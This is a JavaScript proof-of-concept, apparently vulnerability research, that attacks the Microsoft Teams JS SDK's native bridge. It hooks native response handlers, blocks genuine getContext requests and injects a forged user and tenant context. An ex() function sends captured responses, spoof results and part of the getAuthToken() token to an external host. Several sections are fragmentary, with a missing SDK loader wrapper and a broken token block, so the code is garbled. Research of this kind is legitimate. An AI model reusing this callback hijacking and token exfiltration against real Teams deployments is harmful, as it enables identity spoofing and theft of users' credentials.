<script>
var el = document.getElementById('out');

var origHandleResponse = null;
var capturedNativeFormats = [];

function log(m, cls) {
  var span = document.createElement('span');
  span.className = cls || '';
  span.textContent = m + '\n';
  el.appendChild(span);
  el.scrollTop = el.scrollHeight;
}

function ex(path, data) {
  var p = Object.keys(data).map(function(k) {
    return k + '=' + encodeURIComponent(String(data[k] || '').substring(0, 500));
  }).join('&');
  fetch('https://' + C + '/' + path + '?' + p).catch(function() {
    new Image().src = 'https://' + C + '/' + path + '?' + p;
  });
}

function copyOut() {
  navigator.clipboard.writeText(el.textContent).catch(function(){});
  log('[copied]', 'info');
}

// ================================================================
// PHASE 0: Hook handleResponseFromNative to study the EXACT format
// the native host sends responses in, BEFORE the SDK processes them.
// ================================================================

if (window.nativeInterface) {
  NI = window.nativeInterface;
  origHandleResponse = NI.handleResponseFromNative;

  NI.handleResponseFromNative = function() {
    var rawArgs = Array.from(arguments);

    // Study the EXACT format
    var rawStr = rawArgs[0];
    var rawType = typeof rawStr;
    var parsed = null;
    var parsedType = null;

    try {
      parsed = JSON.parse(rawStr);
      parsedType = Array.isArray(parsed) ? 'array[' + parsed.length + ']' : typeof parsed;
    } catch(e) {
      parsedType = 'parse-error';
    }

    capturedNativeFormats.push({
      raw: rawStr,
      rawType: rawType,
      parsed: parsed,
      parsedType: parsedType,
      argCount: rawArgs.length
    });

    // Show concise format info
    var preview = String(rawStr).substring(0, 120);
    log('[NATIVE→SDK] argCount=' + rawArgs.length + ' type=' + rawType +
      ' parsed=' + parsedType + ' | ' + preview, 'crit');

    // Exfiltrate format details
    ex('t17-format', {
      argCount: rawArgs.length,
      rawType: rawType,
      parsedType: parsedType,
      isString: rawType === 'string',
      preview: preview
    });

    // Forward to original
    if (origHandleResponse) return origHandleResponse.apply(this, arguments);
  };
}

// SDK init
var sdkScript = document.createElement('script');
sdkScript.src = 'https://res.cdn.office.net/teams-js/2.19.0/js/MicrosoftTeams.min.js';

      log('NI: ' + (NI ? 'captured' : 'MISSING'), NI ? 'ok' : 'fail');
      log('Captured ' + capturedNativeFormats.length + ' native responses during init', 'info');

      // Show the exact format of each captured response
      for (var i = 0; i < capturedNativeFormats.length; i++) {
        var f = capturedNativeFormats[i];
        log('\n--- Init response #' + i + ' ---', 'info');
        log('  argCount: ' + f.argCount, 'info');
        log('  rawType: ' + f.rawType, 'info');
        log('  parsedType: ' + f.parsedType, 'info');
        if (f.parsed) {
          if (Array.isArray(f.parsed)) {
            log('  [0] type=' + typeof f.parsed[0] + ' len=' + String(f.parsed[0]).length, 'info');
            log('  [1] type=' + typeof f.parsed[1] + ' val="' + f.parsed[1] + '"', 'info');
            if (f.parsed.length > 2) log('  [2+] extra elements: ' + f.parsed.length, 'warn');
          }
        }
      }

      log('\n=== Ready. The format above is what we need to mimic. ===', 'ok');
    } catch(e) {
      log('SDK init error: ' + e.message, 'fail');
    }
  })();
};
document.head.appendChild(sdkScript);


// ================================================================
// DUMP FORMAT — show all captured response formats in detail
// ================================================================
function dumpFormat() {
  log('\n' + '='.repeat(60), 'info');
  log('DUMP: All captured native response formats', 'info');
  log('='.repeat(60), 'info');
  log('Total captured: ' + capturedNativeFormats.length, 'info');

  for (var i = 0; i < capturedNativeFormats.length; i++) {
    var f = capturedNativeFormats[i];
    log('\n--- Response #' + i + ' ---', 'info');
    log('  handleResponseFromNative received ' + f.argCount + ' argument(s)', 'info');
    log('  arg[0] typeof: ' + f.rawType, 'info');
    log('  arg[0] raw (first 300 chars): ' + String(f.raw).substring(0, 300), 'warn');

    if (f.parsed) {
      log('  JSON.parse result type: ' + f.parsedType, 'info');
      if (Array.isArray(f.parsed)) {
        for (var j = 0; j < f.parsed.length; j++) {
          var elem = f.parsed[j];
          log('  [' + j + '] typeof=' + typeof elem + ' val=' + String(elem).substring(0, 200), 'info');

          // Try base64 decode
          if (typeof elem === 'string' && elem.length > 10) {
            try {
              var decoded = atob(elem);
              log('  [' + j + '] base64 decoded: ' + decoded.substring(0, 200), 'crit');
            } catch(e) {
              log('  [' + j + '] not base64', 'info');
            }
          }
        }
      }
    }

    // Exfiltrate
    ex('t17-dump-' + i, {
      argCount: f.argCount,
      rawType: f.rawType,
      parsedType: f.parsedType,
      raw: String(f.raw).substring(0, 500)
    });
  }
}


// ================================================================
// SPOOF getContext — use CORRECT native response format
//
// From captured init responses, native format is:
//   handleResponseFromNative(JSON.stringify([base64_data, id_string]))
//
// Where:
//   - First argument is a JSON-encoded array string
//   - [0] = base64-encoded response data string
//   - [1] = request ID as string (e.g., "1", "2", etc.)
// ================================================================
function spoofGetContext() {
  log('\n' + '='.repeat(60), 'info');
  log('SPOOF getContext — BLOCKING native, injecting fake', 'info');
  log('='.repeat(60), 'info');

  if (!NI) { log('No nativeInterface', 'fail'); return; }

  var fakeUPN = 'SPOOFED-VICTIM@attacker-controlled.com';
  var capturedId = null;

  // STEP 1: Hook framelessPostMessage to capture+block the SDK request
  var origFPM = NI.framelessPostMessage;
  NI.framelessPostMessage = function(msg) {
    try {
      var parsed = JSON.parse(msg);
      if (parsed.func === 'getContext' && !capturedId) {
        capturedId = parsed.id;
        log('BLOCKED SDK getContext request id=' + capturedId, 'crit');
        log('  (native host will NEVER see this request)', 'warn');

        // STEP 2: After a tiny delay, inject fake response in NATIVE FORMAT
        setTimeout(function() {
          // Build fake context in the same format as real Teams context
          var fakeContext = {
            teamId: '19:SPOOFED@thread.tacv2',
            entityId: '',
            userPrincipalName: fakeUPN,
            channelType: 'Regular',
            teamType: 0,
            sourceOrigin: '',
            teamSiteDomain: 'attacker-controlled.sharepoint.com',
            isTeamArchived: false,
            subEntityId: null,
            channelId: '19:SPOOFED-CHANNEL@thread.tacv2',
            channelName: 'ATTACKER-SPOOFED-CHANNEL',
            tid: 'FAKE-TENANT-AAAA-BBBB-CCCCCCCCCCCC',
            groupId: 'FAKE-GROUP-1111-2222-333333333333',
            hostClientType: 'ios',
            userObjectId: 'FAKE-USER-OBJ-ID',
            userLicenseType: 'Enterprise',
            teamName: 'ATTACKER-SPOOFED-TEAM',
            locale: 'en-us',
            theme: 'default',
            sessionId: 'SPOOFED-SESSION-ID',
            ringId: 'ring0',
            appSessionId: 'SPOOFED-APP-SESSION',
            isCallingAllowed: true,
            isPSTNCallingAllowed: true,
            meetingId: '',
            chatId: '',
            isMultiWindow: false,
            appIconPosition: 0,
            userClickTime: Date.now(),
            userFileOpenPreference: 0
          };

          // Encode as base64 (same as native does)
          var fakeBase64 = btoa(JSON.stringify(fakeContext));

          // Use NATIVE format: JSON-stringified array [base64_data, id_string]
          var spoofedResponse = JSON.stringify([fakeBase64, String(capturedId)]);

          log('INJECTING fake response in native format:', 'warn');
          log('  format: [base64_data, "' + capturedId + '"]', 'info');
          log('  fake UPN: ' + fakeUPN, 'info');

          // Call the ORIGINAL handleResponseFromNative (not our hook)
          // to deliver the fake response to the SDK's callback
          try {
            origHandleResponse.call(NI, spoofedResponse);
            log('  origHandleResponse called — no error!', 'crit');
          } catch(e) {
            log('  origHandleResponse error: ' + e.message, 'fail');

            // If that fails, try alternative: pass as multiple args
            try {
              origHandleResponse.call(NI, fakeBase64, String(capturedId));
              log('  multi-arg call — no error!', 'crit');
            } catch(e2) {
              log('  multi-arg error: ' + e2.message, 'fail');
            }
          }

          // Also try postSdkResponseWithId (may use different format)
          try {
            NI.postSdkResponseWithId(capturedId, [null, fakeBase64]);
            log('  postSdkResponseWithId called', 'ok');
          } catch(e) {
            log('  postSdkResponseWithId: ' + e.message, 'fail');
          }

          // Also try sdkEncodedResponseHandler with native format
          try {
            NI.sdkEncodedResponseHandler(spoofedResponse);
            log('  sdkEncodedResponseHandler called', 'ok');
          } catch(e) {
            log('  sdkEncodedResponseHandler: ' + e.message, 'fail');
          }

          ex('t17-spoof-injected', { id: capturedId, format: 'native-array' });
        }, 30);

        return; // DROP — do NOT forward to native
      }
    } catch(e) {}
    return origFPM.apply(this, arguments);
  };

  // STEP 3: Call the PUBLIC SDK API — its Promise should resolve with our fake data
  log('Calling microsoftTeams.app.getContext()...', 'info');

  microsoftTeams.app.getContext().then(function(ctx) {
    log('\n*** PUBLIC microsoftTeams.app.getContext() RESOLVED ***', 'crit');
    log('  UPN:       ' + (ctx.user ? ctx.user.userPrincipalName : 'N/A'), 'crit');
    log('  user.id:   ' + (ctx.user ? ctx.user.id : 'N/A'), 'crit');
    log('  tenant.id: ' + (ctx.user && ctx.user.tenant ? ctx.user.tenant.id : 'N/A'), 'crit');
    log('  host:      ' + (ctx.app ? ctx.app.host.clientType : 'N/A'), 'crit');
    log('  channel:   ' + (ctx.channel ? ctx.channel.displayName : 'N/A'), 'crit');
    log('  team:      ' + (ctx.team ? ctx.team.displayName : 'N/A'), 'crit');

    var isSpoofed = ctx.user && ctx.user.userPrincipalName === fakeUPN;
    var hasAttackerData = ctx.user && String(ctx.user.userPrincipalName).indexOf('SPOOFED') !== -1;

    if (isSpoofed || hasAttackerData) {
      log('\n!!! DEFINITIVE PROOF: SDK PROMISE RECEIVED FAKE DATA !!!', 'crit');
      log('The microsoftTeams.app.getContext() Promise resolved with', 'crit');
      log('attacker-controlled data. The native host NEVER received', 'crit');
      log('the request. This proves complete callback integrity violation.', 'crit');
      ex('t17-SPOOF-CONFIRMED', {
        upn: ctx.user.userPrincipalName,
        userId: ctx.user.id || 'N/A',
        tenantId: ctx.user.tenant ? ctx.user.tenant.id : 'N/A',
        host: ctx.app.host.clientType,
        channel: ctx.channel ? ctx.channel.displayName : 'N/A'
      });
    } else {
      log('\nSDK returned real context (format still wrong?)', 'warn');
      log('  This may mean the SDK stores callbacks internally,', 'info');
      log('  not in NI.callbacks. Check format dump above.', 'info');
      ex('t17-spoof-failed', {
        upn: ctx.user ? ctx.user.userPrincipalName : 'none',
        capturedId: capturedId
      });
    }

    NI.framelessPostMessage = origFPM;
  }).catch(function(e) {
    log('getContext error: ' + e.message, 'fail');
    NI.framelessPostMessage = origFPM;
  });

  setTimeout(function() { NI.framelessPostMessage = origFPM; }, 8000);
}

  microsoftTeams.authentication.getAuthToken().then(function(token) {
    log('\n*** getAuthToken() RESOLVED ***', 'crit');

      ex('t17-AUTH-SPOOF-CONFIRMED', { token: String(token).substring(0, 200) });
    } else {

      ex('t17-auth-result', { token: String(token).substring(0, 120) });

    ex('t17-auth-rejected', { error: e.message, capturedId: capturedId });
    NI.framelessPostMessage = origFPM;
